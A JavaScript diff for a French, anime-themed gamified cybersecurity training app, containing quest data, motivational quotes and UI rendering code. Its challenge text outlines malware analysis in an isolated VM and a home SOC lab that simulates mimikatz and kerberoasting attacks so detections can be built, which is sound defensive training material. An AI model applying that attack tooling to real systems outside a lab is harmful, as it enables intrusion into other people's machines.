+      "Workflow type :\n```\n1. Sample sur MalwareBazaar (filtre par famille connue + ancien)\n2. VM isolée, snapshot, network OFF\n3. Static analysis :\n   - PEStudio (Windows) : imports, sections, signatures\n   - Strings : strings -e l malware.exe (UTF-16 commun)\n   - Yara rules\n4. Dynamic (en sandbox isolée) :\n   - Process Monitor + Process Explorer\n   - Wireshark si tu actives le réseau\n   - RegShot (avant/après)\n5. Reverse statique :\n   - Ghidra : main, imports résolus dynamiquement\n   - Cherche les strings chiffrées\n6. Rapport :\n   - Sample hash (SHA-256)\n   - Compilation timestamp\n   - Imports notables\n   - Comportement\n   - IoCs (IPs, domains, hashes droppés)\n   - MITRE TTPs\n```\n⚠️ Si sample = ransomware actif → pas pour toi maintenant. Privilégie infostealers anciens, droppers."),
+  ],
+  'a-path-4': [
+    l('ap4l1', 'BOSS — SOC complet maison', '1-2 mois',
+      "Construis un home lab Blue Team complet : (1) Wazuh ou ELK comme SIEM, (2) Sysmon sur 2-3 endpoints Windows, (3) Suricata pour le NIDS, (4) un attaquant Kali qui simule des attaques. Build des règles de détection (Sigma) qui détectent les attaques.",
+      "Tu peux : lancer une attaque depuis Kali (mimikatz, kerberoasting, etc.), voir l'alerte dans ton SIEM, et la pivoter jusqu'aux logs source.",
+      "Stack recommandée : ELK (Elasticsearch + Kibana + Filebeat) OU Wazuh (plus clé en main). Sysmon avec config SwiftOnSecurity. Suricata avec ruleset ET ou Emerging Threats.",
+      "Ressources pour le setup :\n- DetectionLab (Chris Long) : github.com/clong/DetectionLab — kit complet\n- HELK : github.com/Cyb3rWard0g/HELK — ELK pour Hunting\n- AtomicRedTeam : github.com/redcanaryco/atomic-red-team — atomic tests pour générer du bruit\n\nWorkflow d'apprentissage :\n1. Setup DetectionLab\n2. Lance Atomic Tests (T1059, T1003, etc.)\n3. Vérifie qu'ils déclenchent des alertes\n4. Sinon, écris une règle Sigma qui détecte\n5. Convertis Sigma → ELK query"),
+  ],
+  'a-boss': [
+    l('aBl1', 'BOSS — Devenir une Vraie Menace', 'variable',
+      "Cumule : (1) certif avancée (OSEP, OSWE, OSED, GCFA), (2) blog/portfolio public avec 5+ articles techniques, (3) outil GitHub avec 50+ stars OU contribution majeure à un outil sec connu, (4) premier vrai contrat/job/bounty significatif.",
+      "Tu es payé pour faire de la cybersécurité, à plein temps ou en mission. Ton GitHub/blog est cité par d'autres pros.",
+      "Le vrai challenge à ce niveau, c'est la VISIBILITÉ. Personne ne sait que tu existes si tu publies pas.",
+      "Plan stratégique :\n- **Blog** : Ghost / Hugo / WordPress, écrits dès que tu apprends un truc\n- **GitHub** : libère TOUS tes scripts/outils créés au long du parcours\n- **LinkedIn** : connecte avec des recruteurs cyber, partage tes articles\n- **Twitter/X infosec** : participe aux discussions, partage tes finds\n- **CTFs publics** : DEF CON CTF, ECSC, Le Hack, NorthSec — tu rencontres tout le monde\n- **Conférences en local** : BSides, OWASP chapters — talk même petit\n\nLa cybersécurité c'est aussi un milieu humain. Les contrats viennent par recommandation à 70%."),
+  ],
+
+  // ============= RANG S =============
+  's-monarch': [
+    l('sMl1', 'BOSS — Premier CVE publié', '3-12 mois',
+      "Trouve une vraie vulnérabilité dans un soft open source ou dans un produit dans le scope d'un programme de divulgation responsable. Suis le process complet : disclosure → vendor coordination → CVE assignment → publication.",
+      "Tu as ton numéro CVE-YYYY-NNNN avec ton nom comme reporter sur cve.mitre.org.",
+      "Approches : (1) audite une lib open source niche que tu connais bien, (2) participe à un programme de disclosure responsable (CERT-FR, MITRE), (3) review de code sur des forks abandonnés.",
+      "Process complet :\n1. **Trouve** : audit de code, fuzzing, analyse statique (Semgrep, CodeQL)\n2. **Reproduis** : PoC qui démontre l'impact\n3. **Contact vendor** : email security@vendor.com avec full disclosure timeline (90 jours par défaut)\n4. **Coordination** : laisse le vendor patcher\n5. **Demande CVE** : via MITRE form ou CNA du produit\n6. **Publication** : avec advisory, blog post, tweet"),
+    l('sMl2', 'BOSS — Talk en conférence', '6-12 mois',
+      "Soumets un talk à une conf sec (Le Hack, NorthSec, BSides, DEF CON Villages). Si accepté, prépare-le et délivre-le.",
+      "Tu as donné une présentation devant un public infosec, ton slide deck est en ligne, et tu as la vidéo (si conf le filme).",
+      "CFP (Call For Papers) : ouvre 3-6 mois avant la conf. Soumets un abstract qui RACONTE UNE HISTOIRE (pas juste 'voici un outil'). Sujets qui marchent : new attack technique, large-scale research, lessons learned d'un engagement.",
+      "Tips CFP :\n- Bidouille un sujet original (pas juste 'OWASP Top 10 expliqué')\n- Présente avec 'storytelling' : problème → tentative → échec → succès\n- Inclus une démo live ou des résultats concrets\n- BSides est plus accessible que DEF CON main track\n- Submit aussi à Le Hack (FR) — moins compétitif, audience excellente"),
+  ],
+  's-ritual': [
+    c('sRc1', 'Daily veille', 'quotidien',
+      "Mets en place une routine de veille : RSS (Feedly) + Twitter list + Mastodon + 1 podcast par semaine. 30 min/jour.",
+      "Tu as 3 articles techniques bookmarkés par semaine que tu pourrais expliquer à un junior.",
+      "RSS recommandés : Project Zero (research), tl;dr sec (newsletter Clint Gibler), Risky Biz News, This Week in 4n6, KitPloit. Podcasts : Risky Biz, Darknet Diaries, NoLimitSecu (FR).",
+      "Ma stack perso recommandée :\n- **RSS aggregator** : Feedly (free), avec un compte\n- **Lists Twitter/X** : crée une liste 'infosec' avec ~30 comptes triés\n- **Mastodon** : infosec.exchange — l'instance de référence\n- **Newsletters** : tl;dr sec (Clint Gibler), Risky Business, SANS NewsBites\n- **Discord** : HackTheBox community, OWASP chapters"),
+  ],
+};
+
+
+
+
+const STAT_GAINS = {
+  main: { INT: 3, AGI: 2, PER: 2, END: 1 },
+  daily: { INT: 1, AGI: 2, END: 2, LCK: 1 },
+  boss: { INT: 5, AGI: 5, PER: 5, END: 3, LCK: 2 },
+  path: { INT: 4, AGI: 3, PER: 4, END: 2, LCK: 1 },
+};
+
+const TYPE_COLORS = {
+  main: { label: 'PRINCIPALE' },
+  daily: { border: '#f59e0b', glow: '#fbbf24', label: 'JOURNALIÈRE' },
+  boss: { border: '#dc2626', glow: '#ef4444', label: 'BOSS' },
+  path: { border: '#7c3aed', glow: '#a78bfa', label: 'VOIE' },
+};
+
+const STAT_DEFS = [
+  { key: 'INT', icon: 'brain', color: '#a78bfa' },
+  { key: 'AGI', icon: 'zap', color: '#fbbf24' },
+  { key: 'PER', icon: 'eye', color: '#22d3ee' },
+  { key: 'END', icon: 'heart', color: '#f87171' },
+  { key: 'LCK', icon: 'sparkles', color: '#34d399' },
+];
+
+const RES_GROUPS = [
+  { key: 'videos', label: 'Vidéos', icon: 'video', cls: 'res-video' },
+  { key: 'platforms', label: 'Plateformes & Pratique', icon: 'globe', cls: 'res-platform' },
+  { key: 'articles', label: 'Articles & Guides', icon: 'book', cls: 'res-article' },
+  { key: 'tools', label: 'Outils', icon: 'wrench', cls: 'res-tool' },
+  { key: 'cheats', label: 'Cheat Sheets', icon: 'list', cls: 'res-cheat' },
+];
+
+// ============= QUOTES DATABASE =============
+// id: pour le tracking | text: la phrase | author: source | source: oeuvre | category: contexte d'apparition
+const QUOTES = [
+  // === SOLO LEVELING ===
+  { id: 'sl1', text: "Le faible n'a pas de choix.", author: "Sung Jinwoo", source: "Solo Leveling", category: ['boot','combat','levelup'] },
+  { id: 'sl2', text: "Deviens fort.", author: "Le Système", source: "Solo Leveling", category: ['boot','levelup'] },
+  { id: 'sl3', text: "Arise.", author: "Sung Jinwoo", source: "Solo Leveling", category: ['levelup','boss'] },
+  { id: 'sl4', text: "Je vais devenir plus fort. Plus fort que quiconque.", author: "Sung Jinwoo", source: "Solo Leveling", category: ['boot','motivation'] },
+  { id: 'sl5', text: "Joueur, une nouvelle quête vous a été assignée.", author: "Le Système", source: "Solo Leveling", category: ['quest','boot'] },
+  { id: 'sl6', text: "Pour me protéger, j'ai dû devenir un monstre.", author: "Sung Jinwoo", source: "Solo Leveling", category: ['combat','levelup'] },
+  { id: 'sl7', text: "Plus on vit dangereusement, plus on devient fort.", author: "Sung Jinwoo", source: "Solo Leveling", category: ['motivation','quest'] },
+  { id: 'sl8', text: "Si tu n'es pas prêt à mourir pour cela, alors abandonne.", author: "Sung Jinwoo", source: "Solo Leveling", category: ['boss','combat'] },
+  { id: 'sl9', text: "Je serai au sommet, peu importe le prix.", author: "Sung Jinwoo", source: "Solo Leveling", category: ['levelup','motivation'] },
+  { id: 'sl10', text: "Quête complétée. Récompenses distribuées.", author: "Le Système", source: "Solo Leveling", category: ['questDone'] },
+  { id: 'sl11', text: "Je suis le seul à pouvoir leveler.", author: "Sung Jinwoo", source: "Solo Leveling", category: ['boot','motivation'] },
+  { id: 'sl12', text: "Levez-vous, mes ombres.", author: "Sung Jinwoo", source: "Solo Leveling", category: ['boss','levelup'] },
+  { id: 'sl13', text: "Le danger est partout. Mais c'est aussi là que se trouve la croissance.", author: "Sung Jinwoo", source: "Solo Leveling", category: ['quest','motivation'] },
+  { id: 'sl14', text: "Tant que je continue à avancer, je n'ai peur de rien.", author: "Sung Jinwoo", source: "Solo Leveling", category: ['motivation','boot'] },
+
+  // === ANIMÉS / MANGAS ÉPIQUES ===
+  { id: 'an1', text: "Si tu n'avances pas, tu recules.", author: "Tradition japonaise", source: "Folklore", category: ['motivation','quest'] },
+  { id: 'an2', text: "Ce monde est cruel. Mais aussi très beau.", author: "Mikasa Ackerman", source: "L'Attaque des Titans", category: ['boot','motivation'] },
+  { id: 'an3', text: "Les rêves, ça commence par ne pas dormir.", author: "Edward Elric", source: "Fullmetal Alchemist", category: ['motivation','boot'] },
+  { id: 'an4', text: "Un homme meurt quand il est oublié.", author: "Dr. Hiluluk", source: "One Piece", category: ['levelup','motivation'] },
+  { id: 'an5', text: "Si tu te lances, ne perds pas. Si tu perds, ne lâche pas.", author: "Naruto Uzumaki", source: "Naruto", category: ['quest','combat'] },
+  { id: 'an6', text: "Crois en toi, ou bien crois en celui qui croit en toi.", author: "Kamina", source: "Gurren Lagann", category: ['boot','motivation'] },
+  { id: 'an7', text: "Sacrifie ton humanité pour devenir plus fort.", author: "Guts", source: "Berserk", category: ['levelup','combat'] },
+  { id: 'an8', text: "Continue. C'est tout ce que tu as à faire.", author: "Saitama", source: "One Punch Man", category: ['motivation','quest'] },
+  { id: 'an9', text: "Aujourd'hui je suis plus fort qu'hier.", author: "Rock Lee", source: "Naruto", category: ['questDone','motivation'] },
+  { id: 'an10', text: "Le génie naît du travail acharné.", author: "Might Guy", source: "Naruto", category: ['questDone','motivation'] },
+  { id: 'an11', text: "Plus tu as peur, plus tu deviens fort.", author: "Yuji Itadori", source: "Jujutsu Kaisen", category: ['combat','boss'] },
+  { id: 'an12', text: "Tant qu'il y a une volonté, il y a un chemin.", author: "Eren Yeager", source: "L'Attaque des Titans", category: ['motivation','boot'] },
+
+  // === DARK SOULS / ELDEN RING / GAMES ===
+  { id: 'g1', text: "Try harder.", author: "Offensive Security", source: "OSCP", category: ['boss','motivation'] },
+  { id: 'g2', text: "Don't give up, skeleton.", author: "Solaire", source: "Dark Souls", category: ['quest','motivation'] },
+  { id: 'g3', text: "Praise the sun.", author: "Solaire", source: "Dark Souls", category: ['questDone'] },
+  { id: 'g4', text: "Tarnished, become Elden Lord.", author: "Marika", source: "Elden Ring", category: ['levelup','boss'] },
+  { id: 'g5', text: "Wake up, samurai. We have a city to burn.", author: "Johnny Silverhand", source: "Cyberpunk 2077", category: ['boot','combat'] },
+  { id: 'g6', text: "The cake is a lie.", author: "GLaDOS", source: "Portal", category: ['boot'] },
+  { id: 'g7', text: "It's dangerous to go alone. Take this.", author: "Old Man", source: "Zelda", category: ['boot','quest'] },
+
+  // === CITATIONS HACKERS / CYBERSEC ===
+  { id: 'h1', text: "Hack the planet.", author: "Hackers (1995)", source: "Pop culture", category: ['boot','combat'] },
+  { id: 'h2', text: "Information wants to be free.", author: "Stewart Brand", source: "Hacker Ethic", category: ['boot','motivation'] },
+  { id: 'h3', text: "L'amateur s'entraîne jusqu'à ce qu'il réussisse. Le pro s'entraîne jusqu'à ce qu'il ne puisse plus échouer.", author: "Anonyme", source: "Méthode hacker", category: ['quest','motivation'] },
+  { id: 'h4', text: "Think different. Hack everything.", author: "Hacker Manifesto", source: "Phrack 7", category: ['boot','combat'] },
+  { id: 'h5', text: "Le code est la loi.", author: "Lawrence Lessig", source: "Code: Version 2.0", category: ['boot'] },
+  { id: 'h6', text: "Mon crime est la curiosité. Mon crime est de juger les gens sur ce qu'ils disent et pensent, pas sur ce qu'ils paraissent.", author: "The Mentor", source: "Hacker Manifesto (1986)", category: ['boot','motivation'] },
+  { id: 'h7', text: "There is no patch for human stupidity.", author: "Kevin Mitnick", source: "The Art of Deception", category: ['boot','combat'] },
+  { id: 'h8', text: "Donne à un homme un exploit, il piratera un jour. Apprends-lui à exploiter, il piratera toute sa vie.", author: "Anonyme", source: "Wisdom infosec", category: ['questDone','motivation'] },
+  { id: 'h9', text: "Stay paranoid.", author: "Communauté infosec", source: "Mantra", category: ['boot','combat'] },
+  { id: 'h10', text: "RTFM. Read The Friendly Manual.", author: "Tradition Unix", source: "Folklore hacker", category: ['quest'] },
+  { id: 'h11', text: "Une faille n'attend pas, elle se cherche.", author: "Anonyme", source: "Méthode pentest", category: ['quest','combat'] },
+  { id: 'h12', text: "Le système est aussi sûr que son maillon le plus faible.", author: "Bruce Schneier", source: "Secrets and Lies", category: ['boot'] },
+  { id: 'h13', text: "Il y a deux types d'entreprises : celles qui ont été piratées, et celles qui ne le savent pas encore.", author: "John Chambers", source: "Cisco", category: ['boot'] },
+  { id: 'h14', text: "Le mot de passe le plus sécurisé est celui que tu n'as pas à retenir.", author: "Anonyme", source: "Sagesse cyber", category: ['boot'] },
+  { id: 'h15', text: "Trust, but verify. Then verify again.", author: "Communauté infosec", source: "Zero Trust", category: ['quest'] },
+
+  // === STOÏCISME / PHILOSOPHIE GUERRIÈRE ===
+  { id: 'p1', text: "Tu as pouvoir sur ton esprit, pas sur les événements extérieurs. Réalise cela, et tu trouveras la force.", author: "Marc Aurèle", source: "Pensées pour moi-même", category: ['boot','motivation'] },
+  { id: 'p2', text: "L'obstacle est le chemin.", author: "Marc Aurèle", source: "Pensées", category: ['quest','motivation'] },
+  { id: 'p3', text: "Persévérance. Patience. Précision.", author: "Miyamoto Musashi", source: "Le Livre des Cinq Anneaux", category: ['quest','motivation'] },
+  { id: 'p4', text: "Mille jours d'entraînement pour développer. Dix mille pour polir.", author: "Miyamoto Musashi", source: "Le Livre des Cinq Anneaux", category: ['questDone','motivation'] },
+  { id: 'p5', text: "La meilleure vengeance, c'est de ne pas leur ressembler.", author: "Marc Aurèle", source: "Pensées", category: ['boot'] },
+
+  // === RETOUR / RÉVEIL ===
+  { id: 'r1', text: "Tu es revenu. Le donjon t'attendait.", author: "Le Système", source: "Hunter Protocol", category: ['return'] },
+  { id: 'r2', text: "L'absence rend le chasseur plus faible. Reviens vite.", author: "Le Système", source: "Hunter Protocol", category: ['return'] },
+  { id: 'r3', text: "Le Système t'observe. Toujours.", author: "Le Système", source: "Hunter Protocol", category: ['return','boot'] },
+];
+
+const QUOTE_TRIGGERS = {
+  // Catégories utilisées selon le contexte
+  boot: ['boot','motivation'],          // Au lancement
+  questDone: ['questDone','motivation'], // Quête complète terminée
+  levelup: ['levelup','combat'],         // Level up cinematic
+  boss: ['boss','combat'],               // Ouverture quête boss
+  return: ['return','boot'],             // Retour après absence
+  motivation: ['motivation','quest'],    // Footer / général
+};
+
+function pickQuote(context = 'boot') {
+  const wantedCats = QUOTE_TRIGGERS[context] || ['motivation'];
+  const candidates = QUOTES.filter(q => q.category.some(c => wantedCats.includes(c)));
+  if (candidates.length === 0) return QUOTES[0];
+  return candidates[Math.floor(Math.random() * candidates.length)];
+}
+
+function discoverQuote(quoteId) {
+  if (!state.discoveredQuotes) state.discoveredQuotes = {};
+  if (!state.discoveredQuotes[quoteId]) {
+    state.discoveredQuotes[quoteId] = Date.now();
+    saveState();
+    return true; // newly discovered
+  }
+  return false;
+}
+
+
+const INITIAL_STATE = {
+  xp: 0, totalXp: 0, rank: 'E',
+  stats: { INT: 10, AGI: 10, PER: 10, END: 10, LCK: 10 },
+  completed: {},
+  questsCompleted: {},
+  discoveredQuotes: {},
+};
+
+const INITIAL_SETTINGS = {
+  theme: 'solo',
+  sfx: true,
+  voice: false,
+};
+
+let state = JSON.parse(JSON.stringify(INITIAL_STATE));
+let settings = JSON.parse(JSON.stringify(INITIAL_SETTINGS));
+let activeRank = 'E';
+let expandedQuest = null;
+let audioCtx = null;
+
+function loadState() {
+  try {
+    const saved = localStorage.getItem('hunter-state-v8');
+    if (saved) { state = JSON.parse(saved); activeRank = state.rank; }
+    else {
+      // Migrate from previous versions
+      const prev = localStorage.getItem('hunter-state-v7') || localStorage.getItem('hunter-state-v6') || localStorage.getItem('hunter-state-v5') || localStorage.getItem('hunter-state-v4') || localStorage.getItem('hunter-state-v3') || localStorage.getItem('hunter-state-v2') || localStorage.getItem('hunter-state');
+      if (prev) {
+        state = JSON.parse(prev);
+        let total = 0;
+        Object.keys(state.questsCompleted || {}).forEach(k => {
+          const [rid, qid] = k.split('.');
+          const q = (QUESTS[rid] || []).find(x => x.id === qid);
+          if (q) total += q.xp;
+        });
+        if (total > 0) state.totalXp = total;
+        activeRank = state.rank;
+        saveState();
+      }
+    }
+    if (!state.discoveredQuotes) state.discoveredQuotes = {};
+  } catch (e) { console.error('Load error', e); }
+}
+
+function saveState() {
+  try { localStorage.setItem('hunter-state-v8', JSON.stringify(state)); }
+  catch (e) { console.error('Save error', e); }
+}
+
+function loadSettings() {
+  try {
+    const s = localStorage.getItem('hunter-settings-v8') || localStorage.getItem('hunter-settings-v7') || localStorage.getItem('hunter-settings-v6') || localStorage.getItem('hunter-settings-v5') || localStorage.getItem('hunter-settings-v4') || localStorage.getItem('hunter-settings-v3');
+    if (s) settings = { ...INITIAL_SETTINGS, ...JSON.parse(s) };
+  } catch (e) {}
+}
+
+function saveSettings() {
+  try { localStorage.setItem('hunter-settings-v8', JSON.stringify(settings)); }
+  catch (e) {}
+}
+
+function applyTheme() {
+  document.documentElement.setAttribute('data-theme', settings.theme);
+  if (settings.theme === 'matrix') startMatrixRain();
+  else stopMatrixRain();
+}
+
+function playSound(type) {
+  if (!settings.sfx && type !== 'voice') return;
+  try {
+    if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+    const ctx = audioCtx;
+    if (type === 'check') {
+      const osc = ctx.createOscillator(), gain = ctx.createGain();
+      osc.connect(gain); gain.connect(ctx.destination);
+      osc.frequency.setValueAtTime(880, ctx.currentTime);
+      osc.frequency.exponentialRampToValueAtTime(1320, ctx.currentTime + 0.1);
+      gain.gain.setValueAtTime(0.15, ctx.currentTime);
+      gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.2);
+      osc.start(); osc.stop(ctx.currentTime + 0.2);
+    } else if (type === 'levelup') {
+      // Deep bass rumble + ascending notes
+      const bass = ctx.createOscillator(), bassGain = ctx.createGain();
+      bass.type = 'sawtooth';
+      bass.connect(bassGain); bassGain.connect(ctx.destination);
+      bass.frequency.setValueAtTime(55, ctx.currentTime);
+      bass.frequency.exponentialRampToValueAtTime(110, ctx.currentTime + 1.5);
+      bassGain.gain.setValueAtTime(0.18, ctx.currentTime);
+      bassGain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 1.5);
+      bass.start(); bass.stop(ctx.currentTime + 1.5);
+
+      // Ascending choir-like notes
+      [261, 329, 392, 523, 659, 784, 1047].forEach((freq, i) => {
+        const o = ctx.createOscillator(), g = ctx.createGain();
+        o.type = 'sine';
+        o.connect(g); g.connect(ctx.destination);
+        o.frequency.setValueAtTime(freq, ctx.currentTime + 0.5 + i * 0.12);
+        g.gain.setValueAtTime(0.12, ctx.currentTime + 0.5 + i * 0.12);
+        g.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.5 + i * 0.12 + 0.5);
+        o.start(ctx.currentTime + 0.5 + i * 0.12); o.stop(ctx.currentTime + 0.5 + i * 0.12 + 0.5);
+      });
+    } else if (type === 'glitch') {
+      // Glitch noise burst
+      const buffer = ctx.createBuffer(1, ctx.sampleRate * 0.15, ctx.sampleRate);
+      const data = buffer.getChannelData(0);
+      for (let i = 0; i < data.length; i++) data[i] = (Math.random() * 2 - 1) * 0.3;
+      const noise = ctx.createBufferSource();
+      noise.buffer = buffer;
+      const gain = ctx.createGain();
+      gain.gain.setValueAtTime(0.2, ctx.currentTime);
+      gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.15);
+      const filter = ctx.createBiquadFilter();
+      filter.type = 'bandpass';
+      filter.frequency.value = 2000 + Math.random() * 2000;
+      noise.connect(filter); filter.connect(gain); gain.connect(ctx.destination);
+      noise.start(); noise.stop(ctx.currentTime + 0.15);
+    }
+  } catch (e) {}
+}
+
+function speak(text) {
+  if (!settings.voice) return;
+  try {
+    if ('speechSynthesis' in window) {
+      const u = new SpeechSynthesisUtterance(text);
+      u.rate = 0.85;
+      u.pitch = 0.6;
+      u.volume = 0.7;
+      // Try to find a French voice
+      const voices = speechSynthesis.getVoices();
+      const fr = voices.find(v => v.lang.startsWith('fr'));
+      if (fr) u.voice = fr;
+      speechSynthesis.speak(u);
+    }
+  } catch (e) {}
+}
+
+// Matrix rain effect
+let matrixAnim = null;
+function startMatrixRain() {
+  const canvas = document.getElementById('matrixRain');
+  const ctx = canvas.getContext('2d');
+  const resize = () => { canvas.width = window.innerWidth; canvas.height = window.innerHeight; };
+  resize();
+  window.addEventListener('resize', resize);
+  const chars = 'アイウエオカキクケコサシスセソタチツテトナニヌネノABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+  const fontSize = 14;
+  let columns = Math.floor(canvas.width / fontSize);
+  let drops = Array(columns).fill(1);
+  function draw() {
+    ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    ctx.fillStyle = '#00ff41';
+    ctx.font = fontSize + 'px monospace';
+    for (let i = 0; i < drops.length; i++) {
+      const text = chars.charAt(Math.floor(Math.random() * chars.length));
+      ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+      if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+      drops[i]++;
+    }
+    matrixAnim = requestAnimationFrame(draw);
+  }
+  draw();
+}
+function stopMatrixRain() {
+  if (matrixAnim) cancelAnimationFrame(matrixAnim);
+  matrixAnim = null;
+  const canvas = document.getElementById('matrixRain');
+  if (canvas) {
+    const ctx = canvas.getContext('2d');
+    ctx.clearRect(0, 0, canvas.width, canvas.height);
+  }
+}
+
+function getRank(id) { return RANKS.find(r => r.id === id); }
+function getRankIdx(id) { return RANKS.findIndex(r => r.id === id); }
+function isRankUnlocked(id) { return getRankIdx(id) <= getRankIdx(state.rank); }
+
+function renderHeader() {
+  const r = getRank(state.rank);
+  document.documentElement.style.setProperty('--rank-glow', r.glow);
+  document.documentElement.style.setProperty('--rank-color', r.color);
+  document.getElementById('bgFx').style.background =
+    `radial-gradient(circle at 20% 30%, ${r.glow}15 0%, transparent 40%), radial-gradient(circle at 80% 70%, ${r.glow}10 0%, transparent 40%)`;
+  const title = document.getElementById('mainTitle');
+  title.style.color = r.glow;
+  title.style.textShadow = `0 0 30px ${r.glow}40`;
+  const card = document.getElementById('rankCard');
+  card.style.borderColor = r.color;
+  card.style.boxShadow = `inset 0 0 40px ${r.glow}10`;
+  const letter = document.getElementById('rankLetter');
+  letter.textContent = r.id;
+  letter.style.color = r.glow;
+  letter.style.textShadow = `0 0 30px ${r.glow}`;
+  document.getElementById('rankName').textContent = r.name;
+  document.getElementById('rankName').style.color = r.glow;
+  document.getElementById('rankSub').textContent = r.subtitle;
+  const xpPct = Math.min(100, (state.xp / r.xpToNext) * 100);
+  document.getElementById('xpText').textContent = `XP : ${state.xp} / ${r.xpToNext}`;
+  document.getElementById('xpPct').textContent = xpPct.toFixed(1) + '%';
+  const xpBar = document.getElementById('xpBar');
+  xpBar.style.width = xpPct + '%';
+  xpBar.style.background = `linear-gradient(90deg, ${r.color}, ${r.glow})`;
+  xpBar.style.boxShadow = `0 0 15px ${r.glow}`;
+  document.getElementById('totalXp').textContent = `TOTAL XP : ${state.totalXp}`;
+}
+
+function renderStats() {
+  const list = document.getElementById('statsList');
+  list.innerHTML = STAT_DEFS.map(s => {
+    const v = state.stats[s.key];
+    return `
+      <div class="stat-row">
+        <span class="stat-icon" style="color:${s.color};">${ICONS[s.icon]}</span>
+        <span class="stat-key">${s.key}</span>
+        <div class="stat-bar-wrap"><div class="stat-bar" style="width:${Math.min(100, v)}%; background:${s.color};"></div></div>
+        <span class="stat-val" style="color:${s.color};">${v}</span>
+      </div>
+    `;
+  }).join('');
+}
+
+function renderTabs() {
+  const tabs = document.getElementById('rankTabs');
+  tabs.innerHTML = RANKS.map(r => {
+    const unlocked = isRankUnlocked(r.id);
+    const active = activeRank === r.id;
+    const style = active
+      ? `border-color:${r.glow}; background:linear-gradient(135deg, ${r.color}40, transparent); --rank-glow:${r.glow};`
+      : `--rank-glow:${r.glow};`;
+    return `
+      <button class="rank-tab ${active ? 'active' : ''}" data-rank="${r.id}" ${unlocked ? '' : 'disabled'} style="${style}">
+        ${unlocked ? '' : `<span class="lock-icon">${ICONS.lock}</span>`}
+        <span class="tab-letter">${r.id}</span>
+        <span style="text-align:left;">
+          <span class="tab-name" style="display:block;">${r.name}</span>
+          <span class="tab-duration" style="display:block;">${r.duration}</span>
+        </span>
+      </button>
+    `;
+  }).join('');
+  tabs.querySelectorAll('.rank-tab').forEach(btn => {
+    btn.addEventListener('click', () => {
+      if (btn.disabled) return;
+      activeRank = btn.dataset.rank;
+      expandedQuest = null;
+      renderTabs(); renderQuests();
+    });
+  });
+}
+
+function getQuestProgress(quest) {
+  const total = quest.objectives.length;
+  const done = quest.objectives.filter(o => state.completed[`${activeRank}.${quest.id}.${o.id}`]).length;
+  // Compter aussi les défis (info, n'affecte pas le passage de niveau)
+  const challenges = CHALLENGES[quest.id] || [];
+  const challengesDone = challenges.filter(c => state.completed[`${activeRank}.${quest.id}.challenge.${c.id}`]).length;
+  return { done, total, pct: (done / total) * 100, challengesDone, challengesTotal: challenges.length };
+}
+
+function renderResources(quest) {
+  if (!quest.resources) return '';
+  let html = '<div class="resources">';
+  RES_GROUPS.forEach(g => {
+    const items = quest.resources[g.key];
+    if (!items || items.length === 0) return;
+    html += `<div class="res-group ${g.cls}">
+      <div class="res-group-title">${ICONS[g.icon]} ${g.label}</div>
+      <div class="res-list">
+        ${items.map(it => {
+          const isSearch = it.url.includes('youtube.com/results?');
+          return `
+          <a class="res-link" href="${it.url}" target="_blank" rel="noopener noreferrer" title="${isSearch ? 'Recherche YouTube — choisis la vidéo qui te plaît' : it.url}">
+            ${ICONS.external}
+            <span>${it.text}${isSearch ? ' 🔍' : ''}</span>
+            ${it.lang ? `<span class="res-lang">${it.lang}</span>` : ''}
+          </a>
+        `;}).join('')}
+      </div>
+    </div>`;
+  });
+  html += '</div>';
+  return html;
+}
+
+function escapeHtml(s) {
+  return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+}
+
+function formatChallengeText(text) {
+  // Escape HTML, then format `code` and ```code blocks```
+  let escaped = escapeHtml(text);
+  // Pre blocks first (```...```)
+  escaped = escaped.replace(/```(\w*)\n?([\s\S]*?)```/g, (m, lang, code) => {
+    return `<pre>${code.trim()}</pre>`;
+  });
+  // Inline code (`...`)
+  escaped = escaped.replace(/`([^`]+)`/g, '<code>$1</code>');
+  // Newlines
+  escaped = escaped.replace(/\n/g, '<br>');
+  return escaped;
+}
+
+function renderChallenges(questId) {
+  const challenges = CHALLENGES[questId];
+  if (!challenges || challenges.length === 0) return '';
+
+  let html = `<div class="challenges">
+    <div class="challenges-title">⚔️ DÉFIS PRATIQUES</div>`;
+
+  challenges.forEach((ch, idx) => {
+    const challengeKey = `${activeRank}.${questId}.challenge.${ch.id}`;
+    const isCompleted = !!state.completed[challengeKey];
+    const cssClass = ch.type === 'long' ? 'challenge long' : 'challenge';
+    const numLabel = ch.type === 'long' ? 'BOSS' : `DÉFI ${idx + 1}`;
+
+    html += `
+      <div class="${cssClass}${isCompleted ? ' completed' : ''}" data-challenge-id="${ch.id}">
+        <div class="challenge-header">
+          <span class="challenge-num">${numLabel}</span>
+          <span class="challenge-time">⏱ ${escapeHtml(ch.time)}</span>
+          <span class="challenge-title">${escapeHtml(ch.title)}</span>
+        </div>
+        <div class="challenge-desc">${formatChallengeText(ch.desc)}</div>
+        <div class="challenge-validate">
+          <strong>✓ VALIDATION :</strong> ${formatChallengeText(ch.validate)}
+        </div>
+        <div class="challenge-toggles">
+          ${ch.hint ? `<button class="challenge-toggle-btn hint" data-toggle="hint-${ch.id}">💡 Hint</button>` : ''}
+          ${ch.solution ? `<button class="challenge-toggle-btn solution" data-toggle="solution-${ch.id}">🔓 Solution</button>` : ''}
+        </div>
+        ${ch.hint ? `<div class="challenge-reveal hint-content" id="hint-${ch.id}">${formatChallengeText(ch.hint)}</div>` : ''}
+        ${ch.solution ? `<div class="challenge-reveal solution-content" id="solution-${ch.id}">${formatChallengeText(ch.solution)}</div>` : ''}
+        <div class="challenge-check" data-challenge-check="${ch.id}">
+          <div class="challenge-checkbox${isCompleted ? ' done' : ''}">${ICONS.check}</div>
+          <span class="challenge-check-label">${isCompleted ? 'DÉFI COMPLÉTÉ' : 'Marquer comme complété'}</span>
+        </div>
+      </div>
+    `;
+  });
+
+  html += '</div>';
+  return html;
+}
+
+function renderQuests() {
+  const list = document.getElementById('questsList');
+  const rank = getRank(activeRank);
